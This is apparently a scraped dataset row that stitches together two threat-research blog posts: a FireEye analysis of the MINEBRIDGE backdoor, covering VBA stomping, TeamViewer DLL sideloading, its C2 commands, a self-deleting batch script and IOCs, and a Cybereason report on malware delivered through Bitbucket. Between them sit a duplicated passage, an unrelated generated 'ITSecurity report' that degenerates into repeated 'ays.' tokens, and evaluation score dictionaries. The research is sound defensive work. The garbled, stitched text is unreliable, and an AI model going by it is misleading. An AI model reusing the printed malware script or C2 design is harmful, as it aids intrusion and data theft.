VBA source is a blank Sub procedure definition. A quick glance at the p-code identifies both network- based indicators and host- based indicators we can use to determine what this sample would do when executed on the proper Office version. When we attempt to open the macro in the GUI editor, Office gets angry:For analysts looking to identify this methodology holistically, we recommend the following considerations:The GUI hiding functionality results in an altered project stream wherein a module exists, but there is no module, class, or baseclass defined in the stream. This is a potential static detection.While the macro source is no longer present, there are still static strings present in Module1 in this sample which may indicate Windows APIs leveraged. This is a potential static detection.Utilities like the previously mentioned oletools can do all of this detection for you. If you identify false negatives, false positives, or bugs, the open source project maintainers respond to them regularly like the superheroes that they are:The above methodology creates questions regarding potential efficiency problems for scaling any sizable campaign using it. While tools like EvilClippy provide the means to create difficult to detect malicious documents that can potentially sneak past some dynamic and static detections, their payloads have the additional burden of needing to fingerprint targets to enable successful execution. While actors with sufficient resources and creativity can no doubt account for these requirements, it is relevant to note that detections for these methodologies will likely yield more targeted activity. In fact, tertiary review of samples employing these techniques identified unrelated activity delivering both Cobalt Strike BEACON and POSHC2 payloads.We recently expanded our internal FireEye threat behavior tree to accommodate these techniques. At the time of publication, the authors were unable to directly map the methods - PROJECT stream manipulation and VBA stomping - to existing techniques in the MITRE ATT&CK Matrix(tm) for Enterprise. However, our team submitted these as contributions to the ATT&CK knowledge base prior to publication and will make additional data available for ATT&CK Sightings.Crossing The Bridge of Khazad-dum: The MINEBRIDGE Infection ChainSuccessful detonation of the previously detailed malicious document results in creation of ""uCWOncHvBb.dll"" via a call to URLDownloadToFileA to the URL hxxps://marendoger[.]com/team/rumba.php. The returned MINEDOOR packed MINEBRIDGE sample is saved in the executing users AppData directory (Eg: C:\Users\username\AppData\Roaming\uCWOncHvBb.dll), and then subsequent execution of the DllRegisterServer export via invocation of ""regsvr32.exe /s %AppData%\uCWOncHvBb.dll"" occurs:This will result in a ZIP file being retrieved from the URL hxxps://creatorz123[.]top/~files_tv/~all_files_m.bin using the Windows API URLDownloadToFileW. The ZIP file is written to %TEMP%, unzipped to the newly created directory %AppData%\Windows Media Player, and then deleted:The ZIP file contains legitimate files required to execute a copy of TeamViewer, listed in the file creation area of the IOC section of this post. When a file named TeamViewer.exe is identified while unzipping, it is renamed to wpvnetwks.exe:After completing these tasks, uCWOncHvBb.dll moves itself to %AppData%\Windows Media Player\msi.dll. The phishing macro then closes the handle to msi.dll, and calls CreateProcessA on wpvnetwks.exe, which results in the renamed TeamViewer instance side-loading the malicious msi.dll located alongside it. The malware ensures its persistence through reboot by creating a link file at %CISDL_STARTUP%\Windows WMI.lnk, which points to %AppData%\Windows Media Player\wpnetwks.exe, resulting in its launch at user logon.The end result is a legitimate, though outdated (version 11, compiled on September 17, 2018, at 10:30:12 UTC), TeamViewer instance hijacked by a malicious sideloaded DLL (MINEBRIDGE).MINEBRIDGE is a 32-bit C++ backdoor designed to be loaded by an older, unpatched instance of the legitimate remote desktop software TeamViewer by DLL load-order hijacking. The backdoor hooks Windows APIs to prevent the victim from seeing the TeamViewer application. By default, MINEBRIDGE conducts command and control (C2) communication via HTTPS POST requests to hard-coded C2 domains. The POST requests contain a GUID derived from the system's volume serial number, a TeamViewer unique id and password, username, computer name, operating system version, and beacon interval. MINEBRIDGE can also communicate with a C2 server by sending TeamViewer chat messages using a custom window procedure hook. Collectively, the two C2 methods support commands for downloading and executing payloads, downloading arbitrary files, self-deletion and updating, process listing, shutting down and rebooting the system, executing arbitrary shell commands, process elevation, turning on/off TeamViewer's microphone, and gathering system UAC information.MINEBRIDGE's default method of communication is sending HTTPS POST requests over TCP port 443. This method of communication is always active, however, the beacon-interval time may be changed via a command. Before sending any C2 beacons, the sample waits to collect the TeamViewer generated unique id (<tv_id>) and password (<tv_pass>) via SetWindowsTextW hooks.This specific sample continuously sends an HTTP POST request over TCP port 443 with the URI ~f83g7bfiunwjsd1/g4t3_indata.php to each host listed below until a response is received.123faster[.]topconversia91[.]topfatoftheland[.]topcreatorz123[.]topcompilator333[.]topThe POST body contains the formatted string uuid=<guid>&id=<tv_id>&pass=<tv_pass>&username=<user_name>&pcname=<comp_name>&osver=<os_version>&timeout=<beacon_interval> where <guid> is a GUID derived from the system's volume serial number and formatted using the format string %06lX-%04lX-%04lX-%06lX. Additionally, the request uses the hard-coded HTTP User-Agent string ""Mozilla/5.0 (iPhone, CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B150 Safari/604.1""After a response is received, it's processed for commands. A single response may contain multiple commands. For each command executed, the sample sends an HTTPS POST request over TCP port 443 indicating success or failure. The sample responds to the commands below.Command Description drun Download and execute an executable from a URL provided in the command. File saved to %TEMP%\<32_rand_chars>.exe. rundll_command Download a custom XOR-encoded and LZNT1 compressed DLL from a URL provided in the command and save to %TEMP%\<32_rand_chars>. Decode, decompress, and load the DLL in memory and call its entrypoint. update_command Move sample file to <sample_name>.old and download a new version of itself to <sample_name> where <sample_name> is the name of this sample (i.e., msi.dll). Relaunch the hosting TeamViewer application with command-line argument COM1_. Delete <sample_name>.old. restart_command Relaunch the hosting TeamViewer application with command-line argument COM1_. terminate_command Terminate the hosting TeamViewer application. kill_command Create and execute the self-deleting batch script tvdll.cmd to delete all unzipped files as well as the sample file. Terminate the hosting TeamViewer application. poweroff_command Shutdown the system. reboot_command Reboot the system. setinterval_command Update the C2 beacon-interval time.After executing all commands in the response, the sample sleeps for the designated C2 beacon-interval time. It repeats the process outlined above to send the next C2 beacon. This behavior repeats indefinitely.The self-deleting batch script tvdll.cmd contains the following content where <renamed_TeamVeiwer> is the renamed TeamViewer executable (i.e., wpvnetwks.exe) and <sample_name> is the name of this sample (i.e., msi.dll).@echo offping 1.1.1.1 -n 1 -w 5000 > nulgoto nosleep1:redel1ping 1.1.1.1 -n 1 -w 750 > nul:nosleep1attrib -a -h -s -r %~d0%~p0TeamViewer_Resource_en.dlldel /f /q %~d0%~p0TeamViewer_Resource_en.dllif exist ""%~d0%~p0TeamViewer_Resource_en.dll"" goto redel1goto nosleep2:redel2ping 1.1.1.1 -n 1 -w 750 > nul:nosleep2attrib -a -h -s -r %~d0%~p0TeamViewer_StaticRes.dlldel /f /q %~d0%~p0TeamViewer_StaticRes.dllif exist ""%~d0%~p0TeamViewer_StaticRes.dll"" goto redel2goto nosleep3:redel3ping 1.1.1.1 -n 1 -w 750 > nul:nosleep3attrib -a -h -s -r %~d0%~p0TeamViewer_Desktop.exedel /f /q %~d0%~p0TeamViewer_Desktop.exeif exist ""%~d0%~p0TeamViewer_Desktop.exe"" goto redel3goto nosleep4:redel4ping 1.1.1.1 -n 1 -w 750 > nul:nosleep4attrib -a -h -s -r %~d0%~p0TeamViewer.inidel /f /q %~d0%~p0TeamViewer.iniif exist ""%~d0%~p0TeamViewer.ini"" goto redel4goto nosleep5:redel5ping 1.1.1.1 -n 1 -w 750 > nul:nosleep5attrib -a -h -s -r %~d0%~p0<sample_name>del /f /q %~d0%~p0<sample_name>if exist ""%~d0%~p0<sample_name>"" goto redel5goto nosleep6:redel6ping 1.1.1.1 -n 1 -w 750 > nul:nosleep6attrib -a -h -s -r %~d0%~p0<renamed_TeamVeiwer>del /f /q %~d0%~p0<renamed_TeamVeiwer>if exist ""%~d0%~p0<renamed_TeamViewer>"" goto redel6attrib -a -h -s -r %0del /f /q %0Possible Connection to Another Intrusion SetThe identified MINEBRIDGE samples have been packed within a loader we call MINEDOOR. Since Fall 2019, we've observed a group publicly tracked as TA505 conducting phishing campaigns that use MINEDOOR to deliver the FRIENDSPEAK backdoor. The combination of MINEDOOR and FRIENDSPEAK has also been publicly discussed using the name Get2.The limited overlap in tactics, techniques, and procedures (TTPs) between campaigns delivering MINEBRIDGE and those delivering FRIENDSPEAK may suggest that MINEDOOR is not exclusive to TA505. Recent campaigns delivering FRIENDSPEAK have appeared to use spoofed sender addresses, Excel spreadsheets with embedded payloads, and campaign-specific domains that masquerade as common technology services. Meanwhile, the campaigns delivering MINEBRIDGE have used actor-controlled email addresses, malicious Word documents that download payloads from a remote server, and domains with a variety of themes sometimes registered weeks in advance of the campaign. The campaigns delivering MINEBRIDGE also appear to be significantly smaller in both volume and scope than the campaigns delivering FRIENDSPEAK. Finally, we observed campaigns delivering MINEBRIDGE on Eastern Orthodox Christmas when Russian-speaking actors are commonly inactive, we did not observe campaigns delivering FRIENDSPEAK during the week surrounding the holiday and language resources in the malware may suggest TA505 actors speak Russian.It is plausible that these campaigns represent a subset of TA505 activity. For example, they may be operations conducted on behalf of a specific client or by a specific member of the broader threat group. Both sets of campaigns used domains that were registered with Eranet and had the registrant location ""JL, US"" or ""Fujian, CN,"" however this overlap is less notable because we suspect that TA505 has used domains registered by a service that reuses registrant information.Post-compromise activity would likely reveal if these campaigns were conducted by TA505 or a second threat group, however, FireEye has not yet observed any instances in which a host has been successfully compromised by MINEBRIDGE. As such, FireEye currently clusters this activity separately from what the public tracks as TA505.AcknowledgmentsFireEye would like to thank all the dedicated authors of open source tooling and research referenced in this blog post. Further, FireEye would like to thank TeamViewer for their collaboration with us on this matter. The insecure DLL loading highlighted in this blog post was resolved in TeamViewer 11.0.214397, released on October 22, 2019, prior to the TeamViewer team receiving any information from FireEye. Additionally, TeamViewer is working to add further mitigations for the malware's functionality. FireEye will update this post with further data from TeamViewer when this becomes available.Indicators of Compromise (IOCs)Suspicious BehaviorsProcess lineage: Microsoft Word launching TeamViewerDirectory Creation: %APPDATA%\Windows Media PlayerFile Creation: %APPDATA%\Windows Media Player\msi.dll %APPDATA%\Windows Media Player\msi.dll.old %APPDATA%\Windows Media Player\tvdll.cmd %APPDATA%\Windows Media Player\wpvnetwks.exe %APPDATA%\Windows Media Player\TeamViewer_Resource_en.dll %APPDATA%\Windows Media Player\TeamViewer_StaticRes.dll %APPDATA%\Windows Media Player\TeamViewer_Desktop.exe %APPDATA%\Windows Media Player\TeamViewer.ini %CSIDL_STARTUP%\Windows WMI.lnk %CSIDL_PROFILE%\<dll_name>.xpdf %TEMP%\<32 random characters> %TEMP%\<32 random characters>.exe %TEMP%\~8426bcrtv7bdf.binNetwork Activity: HTTPS Post requests to C2 URLs User-Agent String: ""Mozilla/5.0 (iPhone, CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B150 Safari/604.1""C2 Domains123faster[.]topconversia91[.]topfatoftheland[.]topcreatorz123[.]topcompilator333[.]topDownload Domainsneurogon[.]comtiparcano[.]comseigortan[.]commarendoger[.]combadiconreg[.]comSender Domainspt-cpaaccountant[.]comrogervecpa[.]comagent4career[.]combestrecruitments[.]comPhishing DocumentsMD5 SHA256 01067c8e41dae72ce39b28d85bf923ee 80e48391ed32e6c1ca13079d900d3afad62e05c08bd6e929dffdd2e3b9f69299 1601137b84d9bebf21dcfb9ad1eaa69d 3f121c714f18dfb59074cbb665ff9e7f36b2b372cfe6d58a2a8fb1a34dd71952 1c883a997cbf2a656869f6e69ffbd027 de7c7a962e78ceeee0d8359197daeb2c3ca5484dc7cf0d8663fb32003068c655 2ed49bd499c9962e115a66665a6944f6 b8f64a83ad770add6919d243222c62471600e64789264d116c560b7c574669ec 3b948368fe1a296f5ed18b11194ce51c 999d4f434bbc5d355656cc2a05982d61d6770a4c3c837dd8ec6aff8437ae405a 4148281424ff3e85b215cd867746b20c 9812123d2367b952e68fa09bd3d1b3b3db81f0d3e2b3c03a53c21f12f1f4c889 54f22fbc84f4d060fcbf23534a02e5f6 7b20e7e4e0b1c0e41de72c75b1866866a8f61df5a8af0ebf6e8dbd8f4e7bdc57 5a3d8348f04345f6687552e6b7469ac1 77a33d9a4610c4b794a61c79c93e2be87886d27402968310d93988dfd32a2ccf 607d28ae6cf2adb87fcb7eac9f9e09ab f3917832c68ed3f877df4cd01635b1c14a9c7e217c93150bebf9302223f52065 9ba3275ac0e65b9cd4d5afa0adf401b4 18698c5a6ff96d21e7ca634a608f01a414ef6fbbd7c1b3bf0f2085c85374516e 9becd2fd73aa4b36ad9cd0c95297d40b 30025da34f6f311efe6b7b2c3fe334f934f3f6e6024e4d95e8c808c18eb6de03 9cce3c9516f0f15ce18f37d707931775 bf0adb30ca230eee6401861e1669b9cfeaa64122cc29c5294c2198f2d82f760e 9faf9e0c5945876c8bad3c121c91ea15 88c4019e66564ad8c15b189b903276910f9d828d5e180cac30f1f341647278fc a37e6eeb06729b6108649f21064b16ef e895dc605c6dcaf2c3173b5ec1a74a24390c4c274571d6e17b55955c9bd48799 ab8dc4ba75aad317abb8ee38c8928db0 212793a915bdd75bede8a744cd99123e2a5ac70825d7b2e1fc27104276a3aafd b8817253288b395cb33ffe36e0072dc9 ba013420bd2306ecb9be8901db905b4696d93b9674bd7b10b4d0ef6f52fbd069 cb5e5d29f844eb22fecaa45763750c27 4ff9bfde5b5d3614e6aa753cacc68d26c12601b88e61e03e4727ee6d9fe3cdc2 cffda37453e1a1389840ed6ebaef1b0d c9f6ba5368760bf384399c9fd6b4f33185e7d0b6ea258909d7516f41a0821056 dc0e1e4ec757a777a4d4cc92a8d9ef33 ac7e622e0d1d518f1b002d514c348a60f7a7e7885192e28626808a7b9228eab6 e5c7e82670372e3cf8e8cab2c1e6bc17 eba3c07155c47a47ee4d9b5201f47a9473255f4d7a6590b5c4e7b6e9fc533c08 f93062f6271f20649e61a09c501c6c92 3f4f546fba4f1e2ee4b32193abcaaa207efe8a767580ab92e546d75a7e978a0bMINEBRIDGE/MINEDOOR Samples";"FireEye has continued to observe multiple targeted phishing campaigns designed to download and deploy a backdoor we track as MINEBRIDGE. The campaigns primarily targeted financial services organizations in the United States, though targeting is likely more widespread than those we've initially observed in our FireEye product telemetry. At least one campaign targeted South Korean organizations, including a marketing agency.In these campaigns, the phishing documents appeared to be carefully crafted and leveraged some publiclydocumented but in our experience uncommon and misunderstood TTPs, likely in an effort to decrease detection of the malicious documents' macros. The actor also used a selfhosted email marketing solution across multiple campaigns. Notably, the payload delivered in these campaigns leveraged a packer previously affiliated with a commonlytracked threat actor, an overlap that we will explore later.This blog post will review the theme of these campaigns and their targets, the adversary's unique tradecraft, the MINEBRIDGE C++ backdoor, some potential attribution overlaps, and importantly the threat actor's love of rap music.Targeting and Lure DetailWhile we first identified MINEBRIDGE samples in December, we observed our first phishing campaigns relating to this activity in early January 2020. Email addresses used to send phishing messages were associated with domains that appear to have been registered specifically for this purpose within a few weeks of the activity and were thematically consistent with the content of the phishing messages.Additionally, the actor(s) responsible are likely using a selfhosted email marketing solution called Acelle. Acelle adds extended email headers to messages sent via the platform in the format of XAcelle<variable>. The messages observed across campaigns using these TTP The phishing documents themselves leverage numerous interesting TTPs including hiding macros from the Office GUI, and VBA stomping.VBA stomping is a colloquial term applied to the manipulation of Office documents where the source code of a macro is made to mismatch the pseudocode (hereto referred to as ""pcode"") of the document. In order to avoid duplicating research and wasting the reader's time, we will instead reference the impressive work of our predecessors and peers in the industry. As an introduction to the concept, we first recommend reading the tool release blog post for EvilClippy from Outflank. The security team at Walmart has also published incredible research on the methodology. Vesselin Bontchev provides a useful open source utility for dumping the pcode from an Office document in pcodedmp. This tool can be leveraged to inspect the pcode of a document separate from its VBA source. It was adopted by the wider open source analysis toolkit oletools in order to detect the presence of stomping via comparison of pcode mnemonics vs keyword extraction in VBA source.That is a whole lot of quality reading for those interested. For the sake of brevity, the most important result of VBA stomping as relevant to this blog post is the following:Static analysis tools focusing on VBA macro source extraction may be fooled into a benign assessment of a document bearing malicious pcode.When VBA source is removed, and a document is opened in a version of Office for which the pcode was not compiled to execute, a macro will not execute correctly, resulting in potential failed dynamic analysis.When a document is opened under a version of Office and the GUI is used to view the macro, the embedded pcode is decompiled to be viewed.The final two points identify some interesting comp The MINEBRIDGE infection chain begins with the malicious document. Upon successful execution of the malicious document, the ""uCWOncHvBb.dll"" file is created via a call to URLDownloadToFileA to the URL hxxps://marendoger[.]com/team/rumba.php. The ""uCWOncHvBb.dll"" file is then used to infect the system with the MINEBRIDGE malware. MINEBRIDGE is a 32bit C++ backdoor designed to be loaded by an older, unpatched instance of the legitimate remote desktop software TeamViewer by DLL loadorder hijacking. The backdoor hooks Windows APIs to prevent the victim from seeing the TeamViewer application. By default, MINEBRIDGE conducts command and control (C2) communication via HTTPS POST requests to hardcoded C2 domains. The POST requests contain a GUID derived from the system's volume serial number, a TeamViewer unique id and password, username, computer name, operating system version, and beacon interval. MINEBRIDGE can also communicate with a C2 server by sending TeamViewer chat messages using a custom window procedure hook. Collectively, the two C2 methods support commands for downloading and executing payloads, downloading arbitrary files, selfdeletion and updating, process listing, shutting down and rebooting the system, executing arbitrary shell commands, process elevation, turning on/off TeamViewer's microphone, and gathering system UAC information.MINEBRIDGE's default method of communication is sending HTTPS POST requests over TCP port 443. This method of communication is always active; however, the beaconinterval time may be changed via a command. Before sending any C2 beacons, the sample waits to collect the TeamViewer generated unique id (<tv_id>) and password (<tv_pass>) via SetWindowsTextW hooks.This specific sample continuously sends an HTTP POST request over TCP port 443 with the URI ~f83g7bfiunwjsd1/g4t3_indata.php to each host listed below until a response is received.123faster[.]topconversia91[.]topfatofth The ITSecurity report summarizes the security risks associated with the TeamViewer application. The TeamViewer application is susceptible to a variety of security risks, including unauthorized access, data theft, and malware infection. Additionally, the TeamViewer application is vulnerable to bruteforce attacks, password cracking, and session hijacking. ### Output: The ITSecurity report summarizes the security risks associated with the TeamViewer application. The TeamViewer application is susceptible to a variety of security risks, including unauthorized access, data theft, and malware infection. Additionally, the TeamViewer application is vulnerable to bruteforce attacks, password cracking, and session hijacking. No response. , the same. same. same. . . . . . ays. ays. : ays. ays. ays. ays. ays. ays. ays. ays. [ [ays. ays. ays. ays. ays. ays to the same. to . of the same of the same. .";en;{'r': 0.32819722650231126, 'p': 0.908315565031983, 'f': 0.482173170973206};{'r': 0.2650918635170604, 'p': 0.8590522478736331, 'f': 0.40515758951906644};{'r': 0.3274268104776579, 'p': 0.906183368869936, 'f': 0.4810413090603593}
https://www.cybereason.com/blog/research/the-hole-in-the-bucket-attackers-abuse-bitbucket-to-deliver-an-arsenal-of-malware;The Hole in the Bucket: Attackers Abuse Bitbucket to Deliver an Arsenal of Malware;"Research by: Lior Rochberger and Assaf DahanIntroductionCybereason is following an active campaign to deliver an arsenal of malware that is able to steal data, mine for cryptocurrency, and deliver ransomware to victims all over the world. Due to the variety of malware types deployed in this attack, attackers are able to hit victims from all sides and do not have to limit themselves to one attack goal or another. The payloads observed in this campaign originated from different accounts in code repository platform Bitbucket, which was abused as part of the attackers delivery infrastructure.The following malware are deployed and updated using Bitbucket by the threat actor:Predator: Predator is an information stealer that steals credentials from browsers, uses the camera to take pictures, takes screenshots, and steals cryptocurrency wallets.Azorult: Azorult is an information stealer that steals passwords, email credentials, cookies, browser history, IDs, cryptocurrencies, and has backdoor capabilities.Evasive Monero Miner: The Evasive Monero Miner is the dropper for a multi-stage XMRig Miner that uses advanced evasion techniques to mine Monero and stay under the radar.STOP Ransomware: The STOP Ransomware is used to ransom the file system and is based on an open source ransomware platform. It also has downloader capabilities that it uses to infect the system with additional malware.Vidar: Vidar is an information stealer that steals web browser cookies and history, digital wallets, two-factor authentication data, and takes screenshots.Amadey bot : Amadey bot is a simple trojan bot primarily used for collecting reconnaissance information on a target machine.IntelRapid: IntelRapid is a cryptocurrency stealer that steals different types of cryptocurrency wallets.Cybereason reached out to Bitbucket Support and the malicious repositories mentioned in the report were deactivated within a few hours.The flow of the Bitbucket multi-payload attack.This research highlights an ongoing trend with cybercriminals where they abuse legitimate online storage platforms like Github, Dropbox, Google Drive, and Bitbucket to distribute commodity malware.In this campaign, the attackers abuse the Bitbucket platform by creating several user accounts that are updated frequently. Regular updates to the malware stored on these accounts and the use of Themida as a packer are used to evade detection by antivirus products and thwart analysis attempts. They also use the CypherIT Autoit packer to pack Azorult and give additional layers of protection against analysis.This research is particularly interesting because of how the attackers infect a single target machine with multiple different kinds of malware. These kinds of commodity malware are often used for a one-off infection to steal data on the machine and sell it in underground hacking communities. However, in this attack, the attackers chose to integrate malware like coin miners and ransomware, which gives them a more persistent source of revenue. Each piece of malware in this campaign makes the attack stronger, with additional capabilities and features for a greater impact.Key PointsAbuses resource sharing platforms: The Cybereason Nocturnus team is investigating an ongoing campaign that abuses the Bitbucket infrastructure to store and distribute a large collection of different malware. The attackers aren't satisfied with one payload, they want to use multiple to maximize their revenue.Attacks from all sides: This campaign deploys an arsenal of malware for a multi-pronged assault on businesses. It is able to steal sensitive browser data, cookies, email client data, system information, and two-factor authentication software data, along with cryptocurrency from digital wallets. It is also able to take pictures using the camera, take screenshots, mine Monero, and in certain cases also deploy ransomware.Far Reaching: This ongoing campaign has infected over 500,000 machines worldwide thus far.Modular and Constantly Updating: The attackers leverage Bitbucket to easily update payloads and distribute many different types of malware at once. In order to evade detection, they have an array of user profiles and continuously update their repositories, at times as often as every hour.Many kinds of malware : The attackers use the Evasive Monero Miner to steal a combination of data, mine cryptocurrency, and deploy other malware including the Vidar stealer, Amadey Bot, and IntelRapid. They also use Predator the Thief, Azorult, and the STOP ransomware over the course of their activities.Devastating impact: The combination of so many different types of malware exfiltrating so many different types of data can leave organizations unworkable. This threat is able to compromise system security, violate user privacy, harm machine performance, and cause great damage to individuals and corporations by stealing and spreading sensitive information, all before infecting them with ransomware.For a synopsis of this research, check out the Bitbucket Threat Alert.Table of ContentsAnatomy of the Multi-payload AttackInitial compromise via Predator InfostealerThis attack starts with an unsuspecting user downloading a cracked version of commercial software like Adobe Photoshop, Microsoft Office, and others. Threat actors often target users looking for ""free"" commercial products by bundling legitimate software with different kinds of malware. In this instance, we are seeing vast amounts of cracked software bundled with the Azorult Infostealer and Predator the Thief.Predator the Thief is an information stealer that steals sensitive data like passwords from browsers, takes pictures, takes screenshots, and steals cryptocurrency wallets. Predator had previously been delivered via exploit kits like the RIG Exploit Kit and through phishing attacks.When a user attempts to install the ""free commercial software"", it actually drops Azorult and Predator onto the target machine. Azorult (download.exe) immediately starts stealing information and deleting its binary to cover its tracks. After Azorult executes, Predator (dowloadx.exe) creates a connection to Bitbucket to begin downloading additional payloads.Cybereason UI: the attack tree of the execution of the malicious zip file.We identified the download URLs for additional payloads of Azorult and the Evasive Monero Miner from a Bitbucket repository at hxxps://bitbucket[.]org/patrickhornvist/repo/ by unpacking Predator.Deobfuscated strings in memory from downloadx.exe show download URLs of other malware.There are multiple additional payloads on Bitbucket:1.exe and 3.exe, both of which are Azorult information stealers with different hashes.2.exe and 8800.exe, both of which are Predator the Thief with different hashes.4.exe and 5.exe, both of which are the Evasive Monero Miner with different hashes.111.exe, the STOP ransomware.Screenshot of the Bitbucket repo: https://bitbucket[.]org/patrickhornvist/repo/downloadsThrough research of other samples related to the campaign, we have identified additional Bitbucket repositories that are likely created by the same threat actor with the same set of malware samples. Judging by the number of downloads, we estimate over 500,000 machines have been infected by the campaign so far, with hundreds of machines affected every hour.https://bitbucket[.]org/luisdomingue1/new/downloads/https://bitbucket[.]org/BasilCowan/new/downloads/It's worth noting that the payloads on Bitbucket are updated almost constantly by the threat actor, sometimes as often as every few hours. This is likely done to avoid detection by traditional antivirus by replacing old binaries with fresh ones unknown to AV engines.Evasive AzorultAzorult is an information stealer that uses a quick and dirty approach to steal sensitive data. After it successfully steals sensitive information, it deletes any trace of itself by removing all associated files.Attack Flow for AzorultPredator downloads a secondary downloader which is used to download an evasive version of Azorult. In order to download Azorult, this downloader connects to hxxps://2no[.]co/2QqYb5 and downloads an encoded file in a certificate form named bolo.com.The encoded Azorult payload, a file named bolo.com.The downloader uses certutil.exe , a native Windows binary, to decode the payload using the living-off-the-land technique. We have previously reported how the Ramnit trojan has been decoded using this technique. The contents of the decoded payload have another layer of obfuscation as well.The decoded Azorult payload - grol.To execute the decoded payload, the malware launches the Autoit compiler, which the threat actor renamed to lsm.com. AutoIt is a freeware scripting language used to automate the Windows GUI and general scripting. It is compatible with all versions of Windows with no prerequisites, which makes it a useful tool for attackers looking to create malware.Cybereason UI: the attack tree of the evasive Azorult execution.Once executed, Azorult scans the file system and searches for sensitive data like browser data, cookies, email clients and cryptocurrency wallets. It copies this data to the %TEMP% directory, packs it, and sends it to the attacker. Once all information has been exfiltrated, Azorult removes all data copied to %TEMP% and deletes its binary to cover its tracks.STOP Ransomware and the Vidar StealerThe STOP Ransomware was first discovered in 2018, but began its most aggressive campaigns in early 2019. Over the year, it evolved to strengthen its encryption and evade detection, and at one point was even used to deliver Azorult onto victim's systems.Predator downloads the STOP Ransomware from Bitbucket (111.exe) and executes it. STOP gathers information about the target machine by accessing api.2ip.ua and checks to see if it is running on a VM.STOP creates a folder in %AppData%, copies its binary there, and changes access control to the file using icacls so others cannot access it.STOP creates a RUN registry key and a scheduled task to execute itself every five minutes. While running, it connects to the C2 server, sends the C2 the MD5 hash of the MAC address, and downloads a key for file encryption.STOP also downloads additional payloads onto the machine, including:hxxp://ring2[.]ug/files/cost/updatewin2.exehxxp://ring2[.]ug/files/cost/updatewin1.exehxxp://ring2[.]ug/files/cost/updatewin.exehxxp://ring2[.]ug/files/cost/3.exehxxp://ring2[.]ug/files/cost/4.exehxxp://ring2[.]ug/files/cost/5.exeupdatewin.exe and updatewin2.exe help STOP evade detection, and the other payloads are independent pieces of malware: the Visel Trojan, the infamous Vidar stealer, and several other files.Cybereason UI: the process tree of STOP Ransomware and Vidar stealer.Vidar is a well-known information stealer that collects system information, passwords from browsers, email, and two-factor authentication software data. It stores stolen data in a randomly named folder in %ProgramData% and sends the info to its C2 server, besfdooorkoora[.]com. After the data is sent to the attacker, the malware stops the process and deletes its payload from the machine (5.exe).Evasive Monero Miner: Old Miner, New DropperEver since the rise of Bitcoin, miners have gained popularity in the underground community, becoming one of the best sellers for attackers looking to make an easy profit. In this campaign, attackers continue this trend by distributing an Evasive Monero Miner.The Evasive Monero Miner is a dropper that drops a version of the infamous, open source XMRig miner based on its original source code. An older version of the Evasive Monero Miner was first submitted to VirusTotal in late 2018, but was not discovered until December 2019 after a massive campaign that infected machines all over the world.The dropper is packed with Themida, a powerful packer with anti-debug features and a way of packing that intentionally makes it difficult to manually unpack. It uses an Autoit compiled script to unpack and download the XMRig miner. The dropper also uses several evasive techniques it uses to avoid detection, including code injection, file renaming, encoded files, non-executable extensions, and the ability to connect through Tor.Deep Dive into the Monero DropperWhen the Evasive Monero Miner is first executed, it drops several files in the %TEMP% folder:CL_Debug_Log.txtCR_Debug_Log.txtAsacpiex.dll (same as CR_Debug_Log.txt)CL_Debug_Log.txt is the binary for the 7zip executable renamed to hide its activity. It extracts and decodes a 7zip archive named CR_Debug_Log.txt. CR_Debug_Log.txt extracts a 32-bit and 64-bit version of the payload of the miner, 32.exe and 64.exe, into %TEMP%.After extracting the payload, the dropper deletes the encoded archive CR_Debug_Log.txt and checks if the machine's architecture is 32-bit or 64-bit. Depending on the results of the check, it copies the relevant binary, renames it helper.exe, and saves it in \AppData\Roaming\Microsoft\Windows.Cybereason UI: attack tree of the execution of the XMRig Miner DropperThe dropper also creates an XML file in %TEMP% named SystemCheck.xml along with a scheduled task SystemCheck that runs the XML file every minute.The XML file is configured to run helper.exe with the argument -SystemCheck:How Sys5emCheck.xml executes helper.exe.helper.exe is a compiled Autoit script. The script sets a few variables for the malware configuration, including:Command line parameterTCP ProtocolThe mining pool for the miner, with port manip2[.]hk:7777.A list of processes it must check to see if it is being analyzed.Two URL paths public2/udp.txt and public2/32/32.txt, or fpublic2/64/64.txt for the 64-bit version.A password DxSqsNKKOxqPrM4Y3xeK that, based on the name of the variable, is used to decrypt an archive.helper.exe decompiled code: the variables setting.helper.exe contains two embedded binaries built during execution, the first of which is a 7zip binary.helper.exe decompiled code: 7Zip binary embedded code.The second is an encoded 7zip archive for a Tor client named Tor.tmp. Tor.tmp is decoded using the embedded password in helper.exe and extracted to \AppData\Roaming\Microsoft\Windows\Tor\.helper.exe decompiled code: Tor client embedded code.Cybereason UI: command line used to extract the Tor.tmp archive.The dropper checks for various antivirus engines on the target machine, as well as if the SmartScreen feature of Windows Defender exists. SmartScreen is used to protect against phishing and various malware websites.The helper.exe decompiled code: an embedded list of security products.helper.exe holds four domains encoded in Base64:helper.exe decompiled code: embedded Base64 encoded domains.The decoded domains:bgpaio75egqvqigekt5bqfppzgth72r22f7vhm6xolzqd6ohroxs7pqd[.]onionjr2jjfxgklthlxh63cz3ajdvh7cj6boz3c3fbhriklk7yip4ce4vzsyd[.]onionuovyniuak3w4d3yzs4z4hfgx2qa6l2u6cx4wqsje4pmnmygc6vfddwqd[.]onionRcjndzwubq5zbay5xoqk4dnc23gr4ifseqqsmbw5soogye6yysc7nkyd[.]onionThe dropper uses the Tor client to connect to one of the decoded domains, combined with the URL paths, and downloads the contents into a file named SysBackup.tmp and the malware version into a file name upd.version to the target machine. Both of these files are created under \AppData\Roaming\Microsoft\Windows\.helper.exe decompiled code: creating the GET request that downloads the XMRig miner - SysBackup.tmp.After the file is downloaded, the dropper terminates tor.exe.Sysbackup.tmp houses a bytes array for the XMRig miner executable.XMRig file properties.helper.exe spawns attrib.exe and injects the XMRig miner code into memory.XMRig code floating in memory of attrib.exe. Taken using Process Hacker.The dropper executes attrib.exe with a command line that specifies the mining pool and the wallet where the miner will add its resources.helper.exe decompiled code: building the command line for attrib.exe.Closing ThoughtsAttackers continue to abuse legitimate online storage platforms for their own gain. By storing malicious payloads on trusted platforms, attackers can bypass security products to exploit the trust given to legitimate online services. In addition, it provides the attackers with another way of reducing the risk of exposure to their C2 server infrastructure through separating the delivery infrastructure (online storage platforms) from the C2 server infrastructure.In some ways, this attack takes persistent revenue to the next level. These attackers infect the target machine with different kinds of malware to get as much sensitive data as possible, alongside miner capabilities and ransomware capabilities. This attack is the epitome of ""have your cake and eat it too"", with attackers layering malware for maximum impact.Attackers continue to evolve and look for more effective ways to make a profit. They are finding that, 